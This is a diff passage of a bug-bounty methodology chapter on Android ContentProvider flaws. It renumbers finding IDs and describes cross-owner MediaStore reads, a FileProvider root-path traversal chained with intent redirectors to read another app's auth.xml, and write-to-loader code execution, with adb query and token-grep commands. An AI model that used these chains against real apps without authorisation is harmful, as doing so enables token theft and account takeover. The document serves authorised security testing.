   and the provider row's `uri` column either is absent or returns 401/403 on off-device replay.
 
-### D07-069 · MediaStore cross-owner read and `OWNER_PACKAGE_NAME` redaction
+### D07-072 · MediaStore cross-owner read and `OWNER_PACKAGE_NAME` redaction
 
 | | |
 |---|---|
@@ -2455,12 +2607,12 @@ adb shell content query --uri content://media/external_primary/file
   `no access` SecurityException), does not hold `MANAGE_EXTERNAL_STORAGE`, and makes no authorisation
   decision on `OWNER_PACKAGE_NAME`.
 
-### D07-070 · `androidx.startup` authority collision — HYPOTHESIS, run the experiment before reporting
+### D07-073 · `androidx.startup` authority collision — HYPOTHESIS, run the experiment before reporting
 
 | | |
 |---|---|
-| **Severity ceiling** | Low (availability only, **if confirmed**) |
-| **VRT** | `application_level_denial_of_service_dos` (VARIES) — but see the doctrine note below |
+| **Severity ceiling** | Low |
+| **VRT** | `application_level_denial_of_service_dos` (VARIES) — availability only, and **only if the experiment confirms it**; see the doctrine note below |
 | **Attacker** | AM-03 |
 | **Applies to** | apps using AndroidX App Startup or any fixed-authority initialiser |
 | **Maps to** | `topic/libraries/app-startup` (authority format `${applicationId}.androidx-startup`, `android:exported="false"`). **The collision behaviour itself is unverified — do not report it as fact without running the experiment.** |
@@ -2488,7 +2640,7 @@ adb shell dumpsys package providers | grep androidx-startup
 - **Ruled out when:** Step 2 installs successfully, or the app declares no fixed-authority provider outside
   its own `applicationId` namespace. Record the installer output either way.
 
-### D07-071 · Evidence package for a provider finding
+### D07-074 · Evidence package for a provider finding
 
 | | |
 |---|---|
@@ -2504,7 +2656,7 @@ adb shell dumpsys package providers | grep androidx-startup
 - **How:** For a write finding, in this order, named
   `{finding-#}-step{n}-{description}.png` and referenced by filename in the body:
   1. **Pre-state** — `content query` showing the row before, with your marker absent
-     (`grep -c "$M" baseline.txt` = 0, per D07-047).
+     (`grep -c "$M" baseline.txt` = 0, per D07-050).
   2. **The bug** — the `content insert`/`update`/`call` succeeding from an app UID with no permissions.
      The most important artefact.
   3. **Post-state negative** — the old value no longer present.
@@ -2529,7 +2681,7 @@ grep -iE 'token|password|bearer' provider_dump.sanitised.txt | head   # verify
 - **Escalation:** n/a.
 - **Ruled out when:** n/a — unconditional for every write or state-change finding in this domain.
 
-### D07-072 · Pre-severity gate against the Critical claim, not against the bug
+### D07-075 · Pre-severity gate against the Critical claim, not against the bug
 
 | | |
 |---|---|
@@ -2570,7 +2722,7 @@ grep -iE 'token|password|bearer' provider_dump.sanitised.txt | head   # verify
   output — providers are easy to fix quietly, and a same-day patch is common.
 - **Ruled out when:** n/a — unconditional for every Critical/High in this chapter.
 
-### D07-073 · Chain-filing order for provider primitives
+### D07-076 · Chain-filing order for provider primitives
 
 | | |
 |---|---|
@@ -2588,7 +2740,7 @@ grep -iE 'token|password|bearer' provider_dump.sanitised.txt | head   # verify
   1. Identify the highest-severity chained outcome (usually "token theft -> ATO" or "arbitrary write ->
      code execution").
   2. File each primitive separately at its standalone severity, with a placeholder cross-reference line:
-     e.g. the FileProvider `<root-path>` config (D07-054), the redirector that issues the grant (D08), the
+     e.g. the FileProvider `<root-path>` config (D07-057), the redirector that issues the grant (D08), the
      loader that executes the written file (D17).
   3. File the chain consumer with the full narrative at the chained severity, filling in the real primitive
      ids.
@@ -2610,19 +2762,19 @@ These primitives have independent fix surfaces and are filed separately per the 
 
 | Observation | Why it is not a finding | What would make it one |
 |---|---|---|
-| "Exported ContentProvider" flagged by a scanner on an app targeting SDK 34 with an explicit `signature`-level `readPermission` | The permission gate holds; export is a design decision, not a defect | Show the protectionLevel is `normal`/`dangerous` (D07-013), or a path variant that bypasses the gate (D07-019) |
+| "Exported ContentProvider" flagged by a scanner on an app targeting SDK 34 with an explicit `signature`-level `readPermission` | The permission gate holds; export is a design decision, not a defect | Show the protectionLevel is `normal`/`dangerous` (D07-014), or a path variant that bypasses the gate (D07-022) |
 | The `targetSdk < 17` default-export rule fired on a modern app | The default has been `false` since Android 4.2; MobSF gates it on `min_sdk < 17` and reports anyway | The manifest genuinely declares `targetSdkVersion < 17`, quoted from `aapt dump badging` |
-| `grantUriPermissions="true"` on a `FileProvider` | Mandatory for the class — without it the provider throws `SecurityException: Provider must grant uri permissions` | The **path scope** is over-broad (D07-054) or a grant reaches an attacker (D07-021/-022) |
-| `<root-path>` present, provider not exported, no grant path, no URI sink in the app | A configuration observation with no reachable caller; it is a blast-radius multiplier waiting for a primitive | Any of: the provider is exported, a redirector issues grants (D08), or the app opens attacker URIs (D07-053) |
+| `grantUriPermissions="true"` on a `FileProvider` | Mandatory for the class — without it the provider throws `SecurityException: Provider must grant uri permissions` | The **path scope** is over-broad (D07-057) or a grant reaches an attacker (D07-024/-022) |
+| `<root-path>` present, provider not exported, no grant path, no URI sink in the app | A configuration observation with no reachable caller; it is a blast-radius multiplier waiting for a primitive | Any of: the provider is exported, a redirector issues grants (D08), or the app opens attacker URIs (D07-056) |
 | Sensitive data found in `/data/data/<pkg>` via `run-as` or root | AM-12 is not an attack, and the VRT prices it at P5 (`insecure_data_storage...on_internal_storage`). Xiaomi, Grab and Spotify all list app-private storage explicitly out of scope; Google: "Access to non-sensitive internal files of another app also does not qualify" | Pair it with a provider read, traversal or grant that a non-root third party can use, and refile as the **access** bug with the data as the payload |
 | `adb shell content query` returns rows but the same query from a PoC app throws `SecurityException` | `shell` is uid 2000 and holds permissions no third-party app has | Reproduce from an app UID (D07-007). If it only works from `shell`, it is an artefact |
-| drozer `scanner.provider.traversal` / `scanner.provider.injection` reporting "Not Vulnerable" | One payload against one file, and a single-error-string oracle respectively | The manual matrix (D07-029) or the `1=1`/`1=0` body diff (D07-046) plus a source-level check |
+| drozer `scanner.provider.traversal` / `scanner.provider.injection` reporting "Not Vulnerable" | One payload against one file, and a single-error-string oracle respectively | The manual matrix (D07-032) or the `1=1`/`1=0` body diff (D07-049) plus a source-level check |
 | `/etc/hosts` canary failing | Some OEM SELinux policies block it outright; the scanner's only oracle silently reads empty | Re-run with `/proc/version`, which is readable on API 30+, and state the policy caveat |
 | A provider crash from a malformed URI or a null extra | VRT `application_level_denial_of_service_dos.app_crash.malformed_android_intents` = **P5**, and it is a self-inflicted local crash | The crash is a memory-safety primitive in native provider code, or it is persistent (crash-on-launch) — then it is a D19/D04 finding, not D07 |
 | Unbounded `insert` growing the app's database ("flood the provider") | App-local availability loss with no confidentiality impact; most programmes rate it Low or out of scope | The provider backs a critical-path service **and** the programme buys availability — quote the before/after `du -sh` figures and the failure state |
 | Provider SQL injection reachable only through the app's own UI | You are injecting into your own database, as your own user | The same concatenation is reachable through an **exported** provider's `selection`/`projection`/`sortOrder`, i.e. attacker-controlled by any installed app |
-| A `MediaStore` / `Downloads` row returned to your own app | Those providers are designed to be readable; the platform's `SecurityException` on cross-owner reads is the control working | A cross-*owner* read succeeding, or a signed URL in a row that replays off-device (D07-068) |
-| `takePersistableUriPermission` present in the app's code | Defensive use is normal SAF practice | The app **hands out** persistable grants and never revokes them, and you still read after reboot and after the user deleted the item (D07-024) |
+| A `MediaStore` / `Downloads` row returned to your own app | Those providers are designed to be readable; the platform's `SecurityException` on cross-owner reads is the control working | A cross-*owner* read succeeding, or a signed URL in a row that replays off-device (D07-071) |
+| `takePersistableUriPermission` present in the app's code | Defensive use is normal SAF practice | The app **hands out** persistable grants and never revokes them, and you still read after reboot and after the user deleted the item (D07-027) |
 
 ## Cross-surface joins
 
@@ -2631,26 +2783,26 @@ These primitives have independent fix surfaces and are filed separately per the 
   reaches; the redirector decides who gets one. Individually: a config note and a "component forwards an
   intent". Joined: `content://<pkg>.fileprovider/root/data/data/<pkg>/shared_prefs/auth.xml` read by a
   zero-permission app. This is the single highest-yield join in the chapter, and it is the reason
-  `exported="false"` is never a ruled-out basis on its own (D07-022).
+  `exported="false"` is never a ruled-out basis on its own (D07-025).
 - **D07 × D03 — the provider line and the permission line.** A provider guarded by
   `com.target.app.permission.READ_DATA` reads as protected in the manifest review, and the
   `<permission android:protectionLevel="normal">` two hundred lines above reads as unremarkable in the
-  permission review. Join them and the guard is auto-granted to any app that asks (D07-013).
+  permission review. Join them and the guard is auto-granted to any app that asks (D07-014).
 - **D07 × D17 — the write primitive and the loader.** A traversal that honours `"w"` is Medium on its own
   and the Google Mobile VRP says so explicitly. Enumerate `System.load`/`DexClassLoader`/plugin directories
   *first*, choose the destination to match, and the same primitive is the VRP's top-paying category
-  (D07-032, D07-059).
+  (D07-035, D07-062).
 - **D07 × D15 — provider rows as the backend's keys.** Object ids, share tokens and API version strings sit
   in provider rows, and the mobile client's API version is usually older than the web app's. The local read
   is Low at a programme that discounts same-device apps; the forged public share URL from the same token is
-  a remote finding at the same programme (H1 #518669). Always take the row off-device (D07-067).
+  a remote finding at the same programme (H1 #518669). Always take the row off-device (D07-070).
 - **D07 × D10 — `setAllowContentAccess` is on by default.** A WebView that loads any untrusted content can
   `XMLHttpRequest` a `content://` URI. The WebView reviewer tests XSS and origins; the provider reviewer
   tests `adb shell content`. Neither tests the provider *from inside the WebView*, which is where the
   app's own authority is reachable without any IPC at all (MASTG-TEST-0250).
 - **D07 × D09 — deep-link parameters that name a URI.** `targetapp://share?file=...` and
   `?uri=content://...` are tested for open redirect and XSS and never for a `content://` or `file://`
-  payload aimed at the app's own provider. That is the AM-02 delivery route into D07-053 and D07-056.
+  payload aimed at the app's own provider. That is the AM-02 delivery route into D07-056 and D07-059.
 - **D07 × D11 — reachability is what converts storage into a finding.** An unencrypted token in
   `shared_prefs` is P5 by VRT and explicitly out of scope at several programmes. The provider traversal is
   the thing that makes it a P1 read. File the access as the bug and the storage as the payload — never the
@@ -2663,7 +2815,7 @@ These primitives have independent fix surfaces and are filed separately per the 
   `FileProvider`, so the source reviewer records a negative; the merged manifest contains three, each with
   its own paths XML written by a vendor the client has never audited (D07-003).
 - **D07 × D19/D04 — the side-effecting `call()` and the crash surface.** A `call()` method table
-  (D07-016) is simultaneously the richest authorisation-bypass surface and the best-shaped fuzzing corpus
+  (D07-017) is simultaneously the richest authorisation-bypass surface and the best-shaped fuzzing corpus
   in the app. Enumerate once, use twice.
 
 ## Sources
@@ -2712,9 +2864,9 @@ These primitives have independent fix surfaces and are filed separately per the 
   Hacking" and "Hacking InsecureBankv2", Het Mehta Phase 3, hackwithsingh sec-14 series, Indusface,
   YesWeHack Android recon guide, B3nac and saeidshirazi indexes, Mobile Hacking Lab and the MAST Guide,
   devploit on the Google Messages `AvatarContentProvider`.
-- **The 4,467-star bug-hunting corpus** — the layer-ordering trap (D07-006), marker discipline (D07-047),
-  the body-diff and statistical-sample rules (D07-046), the shell-loop ban (D07-008), the shadow-API
-  mobile-to-backend bridge (D07-067), evidence hygiene and the five-screenshot pattern (D07-071), the
-  pre-severity gate and retraction discipline (D07-072), and chain-filing order (D07-073).
+- **The 4,467-star bug-hunting corpus** — the layer-ordering trap (D07-006), marker discipline (D07-050),
+  the body-diff and statistical-sample rules (D07-049), the shell-loop ban (D07-009), the shadow-API
+  mobile-to-backend bridge (D07-070), evidence hygiene and the five-screenshot pattern (D07-074), the
+  pre-severity gate and retraction discipline (D07-075), and chain-filing order (D07-076).
 - **MITRE ATT&CK Mobile** — T1409 Stored Application Data, T1533 Data from Local System, T1636 Protected
   User Data (.001–.005), T1641 Data Manipulation, verified against `data/mitre-attack-mobile-android.csv`.
